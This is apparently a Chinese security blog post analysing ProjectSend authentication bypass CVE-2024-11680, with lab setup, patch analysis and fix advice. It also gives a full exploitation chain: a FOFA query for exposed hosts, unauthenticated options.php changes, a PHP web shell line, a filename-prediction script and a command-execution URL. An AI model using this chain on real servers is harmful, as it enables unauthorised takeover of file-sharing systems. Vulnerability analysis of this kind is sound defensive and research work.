#  【Nday漏洞分析】ProjectSend 身份认证绕过漏洞(CVE-2024-11680)   
jylove  神农Sec   2025-01-06 01:00  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
网络安全领域各种资源，学习文档，以及工具分享、前沿信息分享、POC、EXP分享。  
不定期分享各种好玩的项目及好用的工具，欢迎关注。  
#   
  
原文链接：https://zone.huoxian.cn/d/2961-ndayprojectsend-cve-2024-11680  
  
作者：jylove  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x1 组件简介**  
  
  
ProjectSend 是一个开源文件共享网络应用程序，旨在促进服务器管理员和客户端之间的安全、私密文件传输。  
```
fofa语法：body="ProjectSend"
```  
##   
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x2 漏洞描述**  
  
  
近日，VulnCheck 分配了 CVE-2024-11680，ProjectSend r1720 之前的版本存在身份认证绕过漏洞。远程未经身份验证的攻击者可以通过向 options.php 发送精心设计的 HTTP 请求来利用此漏洞，从而在未经授权的情况下修改应用程序的配置。成功利用此漏洞后，攻击者可嵌入恶意代码、开启创建帐户功能并上传 webshell  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x3 影响版本**  
  
  
ProjectSend < r1720  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x4 环境搭建**  
  
#### 0x01 下载  
  
环境要求：  
  
php 7.4或者以上  
  
MySQL 5.0或者以上（如果您使用的是 8.x 或更高版本，请设置数据库的身份验证方法，使其使用 MySQL 本机密码）  
  
Apache 2.2 or NGINX  
  
使用phpstudy集成环境进行搭建，开启apache,mysql服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7CjCLWh4hicz962AZFJulMqW6QmPFPQ3Wp8Z1aRefCWWucjMVgFbYvoA/640?wx_fmt=jpeg&from=appmsg "")  
  
去官网下载projectsend代码  
  
https://github.com/projectsend/projectsend/releases下载受影响的版本  
  
这里下载了r1650 版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7wibrvQSRicw3I3WTFVribMPNpiavv4749NoWHgicKibSgbBhb98GGXmHAWPQ/640?wx_fmt=png&from=appmsg "")  
  
解压到phpstudy目录  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7MkKeIEIbG4mqyU7uoezpdBIfuxwQC7aRtkpW3MLdKpAMSL9JJk4E5Q/640?wx_fmt=jpeg&from=appmsg "")  
  
访问http://localhost/projectsend/install/make-config.php进行配置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7AwET10qXF7ibndo1MFYLgesbonvvJG3PaWNDGR5A2XqkCicVoWUYeshg/640?wx_fmt=jpeg&from=appmsg "")  
  
在小皮中设置数据库名，用户名，密码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib77pc6yys3F0UwGjUNBPQpCTnffa35bL5QJzRppQrqk4wH6TBZjpmFhw/640?wx_fmt=jpeg&from=appmsg "")  
  
设置完回到刚才的安装页面，修改页面中相应的字段后即可安装  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7qhUPa8AjjJU4UHGsjAz5HIcQrzsHHvTrmDUMxfSFMHh6EOxludA07Q/640?wx_fmt=jpeg&from=appmsg "")  
  
按照提示进行下一步安装即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7piaUbgToXT2RD4M8n25BOQHc6x6HOLryqFtrbEGGI2laA42UFC4sz7g/640?wx_fmt=png&from=appmsg "")  
  
如下图所示，安装完成  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7Km1thFcJiaT4YsC3uNDJ6h2BhHyPA7wAkG0bfhoZDIKCzWMd7K9y6Kg/640?wx_fmt=jpeg&from=appmsg "")  
  
正常能登陆的话是这样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7UJUDMOYyMB9nvrc4JVtwhXMlqTY2hFARdxgXbEeXBO58kWMIiaAox4Q/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x5 漏洞分析**  
  
根据漏洞补丁可以看到该漏洞是由于在header.php文件中设置不同级别的授权，以限制给定用户允许的功能，授权检查可确保用户已登录并具有正确的权限级别。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7saDyrn4lPwID2j6qRAuMUQ3h5pA0AiczbsHVrHyy3UibhsptGy4g3gpQ/640?wx_fmt=png&from=appmsg "")  
  
  
其中大部的文件都调用了该权限验证的文件header.php  
```
include_once ADMIN_VIEWS_DIR . DS . 'header.php';
```  
  
  
但是，这个文件调用是在其他代码执行完后才调用的，所以导致了可以未授权执行文件中的代码后，才进行权限验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7MlnG6TxUnyv57DwQmfGL2P26JEU82bz9ZJgR8upsNckftJAxeZ0SGg/640?wx_fmt=png&from=appmsg "")  
  
  
修复后的代码：  
重新定义了log_in_required函数，作为权限认证函数调用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7BAuvNC54lictq6eXbPmg4dI3fkFncPDzeD7kw2mX67picVpia6DoX4QUQ/640?wx_fmt=png&from=appmsg "")  
  
  
打了补丁后的代码则是在每个文件的开头就进行了权限验证，然后在每个需要用到权限的功能时，在文件开头就调用了该权限验证的函数，以阻止未授权的代码执行  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib70MFOVkiatkILXxKdaaD0xSDiadH74zN3oBsQxquSg1TibnwAoj68IaHdg/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x6 漏洞验证**  
### 漏洞验证  
  
在漏洞介绍中通过向options.php发送特殊请求来触发漏洞  
  
简单验证：  
我们先以管理员的身份登陆站点，访问options.php页面  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7yXviaoabqRicRW1cwaeQZ6Sg7Ahyudh5D1eHiacUjicGpRa1AHJm0wRbtQ/640?wx_fmt=png&from=appmsg "")  
  
  
是一个修改网站配置的地方，用管理员的cookie修改一下配置，改了一下标题，能够正常修改成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7rvaP2ZglXt6nLM8pgicA9OE6Y2UKNqW3z1PHjnSVck1lZro4dzg3fKw/640?wx_fmt=png&from=appmsg "")  
  
  
根据之前的漏洞分析我们可以得知，修改配置的代码其实是在权限验证之后的，所以我们使用一个正常未登陆的cookie的去测试能否修改配置文件，（csrf_token的值也要重新获取一遍）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7oS9ib9qxKq9QBALU3tBHXJZD8LKbSAyptAGyUcKHGcf3Tta07rQReUg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7g88cCwqqrfz9ib45sNibUwRWTmemC2XmRic5YTXARXg0LM37icRuFibJYzA/640?wx_fmt=png&from=appmsg "")  
  
  
使用正常未登陆的cookie直接修改标题成功（如果没有获取cookie的话，也不能修改成功），到这一步就能证明漏洞存在了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7ibZfEtpQAAPD6RWXNwuCGxxff7HhnRhzibqqyibPvM1BZkic5408DDVQaw/640?wx_fmt=png&from=appmsg "")  
###   
### 漏洞利用  
  
系统默认情况下是没有开启注册的，但是我们可以利用这个漏洞使系统开启注册功能和文件上传功能  
clients_can_register，clients_auto_approve 和 clients_can_upload  
  
看回显200的话就是开启成功了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7nQjE0iam3fF2OD6zt0oiccibjdg7zktS1QTUFNFXHPW3gwfOGeJlR5wMQ/640?wx_fmt=png&from=appmsg "")  
  
  
开启后就可以注册一个用户了，看回显示的话，请求头中有这个特征"Location: my_files/index.php"即为成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7BRLkxqaa9tOlq5aicNtMdjGa8fJGDJtF4Z4sFgyIuibdLrSlZcO0GFbg/640?wx_fmt=png&from=appmsg "")  
  
  
使用刚才注册的用户projectsendtest，正常可以登陆  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7JGZ30GAZhpX5OicmcPaYCUzbwAk1ibWrEpodbgWdicJWUZljmItpicloicQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
利用 options.php 上的漏洞，将 .php 添加到允许上传文件的扩展名白名单中  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7KqTPAZoSKxrfhw2gFPFjzQiajUdSyL7wXDyFuXHYpSQHUl4ojhpXWLw/640?wx_fmt=png&from=appmsg "")  
  
  
看回显，200即为开启成功  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7frsFekAXQjY5PQLudlvBynic0IibpCqgmdGGTJGncTbheMy4JfTzJFFQ/640?wx_fmt=png&from=appmsg "")  
  
  
上传文件  
文件内容：<?php system($_GET['cmd']);?>  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7nf9Ea8Y6jJKUffr6iaVVjvMRX70iaI3EqiakEraN0WViaCHmM4eZMxkFDg/640?wx_fmt=png&from=appmsg "")  
  
  
点击save  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7gnRAUiaAu5LSEd8iabn9GYcBeUWW8ia5v1ZzlViaaRkTKx6ZAXvRQv4M0w/640?wx_fmt=png&from=appmsg "")  
  
  
要记录这个点击上传文件时的时间（不准的时候可能会相差个一两秒，可以通过列举前后几秒的形式来生成）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7dAicn44sQIGJS45QtR0UQhqYPjXShwf3m7O6PhrqZ9VQ3CUbOYeYvqg/640?wx_fmt=png&from=appmsg "")  
  
  
上传的文件名为以下格式  
{timestamp}-{sha1(username)}-{filename}  
```
#!/usr/bin/env python3
# coding=utf-8
import datetime
import pytz
import hashlib
#上传文件的时间
date = '2024-11-29 20:21:51'
beijing_time =datetime.datetime.strptime(date, '%Y-%m-%d %H:%M:%S')
#时区要和options.php里面的时区一致，一般默认安装的话是Shanghai,如果不是的话，可以通过未授权的操作改下这个时区为Shanghai
beijing_tz = pytz.timezone('Asia/Shanghai')
localized_beijing_time = beijing_tz.localize(beijing_time)
timestamp = int(localized_beijing_time.timestamp())
#注册的用户名
input_string='projectsendtest'
sha1 = hashlib.sha1()
sha1.update(input_string.encode('utf-8'))
hash_value = sha1.hexdigest()
#上传的文件名，这里为cmd.php
name='{}-{}-{}'.format(timestamp,hash_value,'cmd.php')
print (name)
```  
  
改时区的操作  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7v1TiceBzXS4Pq25wSdINty2bBabx0ZL6cfXMicGZPdWZfEQJIDN3jhcA/640?wx_fmt=png&from=appmsg "")  
  
这里上传的时间为2024-11-29 20:21:51，文件名为cmd.php,sha1(projectsendtest)为197aaa8708c5ce35805cd8001c02430de03ba0d8  
  
最后生成的文件名为：  
1732882911-197aaa8708c5ce35805cd8001c02430de03ba0d8-cmd.php  
  
访问上传的文件名，（upload/files/为默认上传目录）并执行命令：  
```
http://projectsend1128.com:8087/projectsend/upload/files/1732882911-197aaa8708c5ce35805cd8001c02430de03ba0d8-cmd.php?cmd=whoami #执行命令成功
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7EibFM5ic4nl8j5Dhn0nibDPnibJaF2xerH6A2H0WYAtShywM5ALuSZDCFQ/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x7 漏洞影响**  
  
  
通过以上过程，我们可以看到该漏洞危害极大，且该漏洞利用难度也极低，可以通过未授权开启注册用户，并利用注册用户上传webshell文件，所以有相关组件的用户，应该及时进行修复，避免后续遭利用。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x8 修复建议**  
  
1.升级版本  
目前官方已有可更新版本，建议受影响用户升级至最新版本：ProjectSend >= r1720  
官方补丁下载地址：  
https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744  
  
最新安全版本：  
https://github.com/projectsend/projectsend/releases/tag/r1720  
  
  
2.临时措施:  
设置upload/files/.htaccess目录中为不可执行，在.htaccess文件中加上下面的字段即可  
```
php_flag engine off
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7ZhHJjOrEEhSpiazGOA9kdYOeWzPKwjlUDQtEz3yialGPtbsRn07UDlhA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
设置完，则无法可执行PHP代码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXlWLwBljX4HezHat8e93ib7DdseaTDWAKE2Bd3vsNDstDv5BcibibMGYFhWjbkJTODf70ibicubm4x2Cw/640?wx_fmt=jpeg&from=appmsg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iabIwdjuHp2VkevXU9Iiad0pl0dnkk6GmAQNiaqmb1kKX2NGKhaGF7m8UicdyCp9agykgzj7pNN1oEw4b3QLvFbibzQ/640?wx_fmt=png&from=appmsg&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
****  
**0x9 参考链接**  
  
https://github.com/projectsend/projectsend/commit/193367d937b1a59ed5b68dd4e60bd53317473744  
  
https://github.com/projectdiscovery/nuclei-templates/blob/main/http/vulnerabilities/projectsend-auth-bypass.yaml  
  
https://github.com/projectsend/projectsend/releases/tag/r1720  
  
  
我们是神农安全，  
**点赞 + 在看**  
 铁铁们点起来，最后祝大家都能心想事成、发大财、行大运。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
圈子专注于更新  
**src/红蓝攻防**  
相关：  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
```  
  
  
  
  
  
  
```
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWBeNFS2WNPd2FJ1SmqGkcf3s0DkMZicbriaUEuXagWt2eqxBWkUXRyQabIczmNAT5nTxc9tvaBzlww/640?wx_fmt=png&from=appmsg "")  
  
  
**欢迎加入星球一起交流，券后价仅40元！！！ 即将满200人涨价**  
  
**长期更新，更多的0day/1day漏洞POC/EXP**  
  
    
  
  
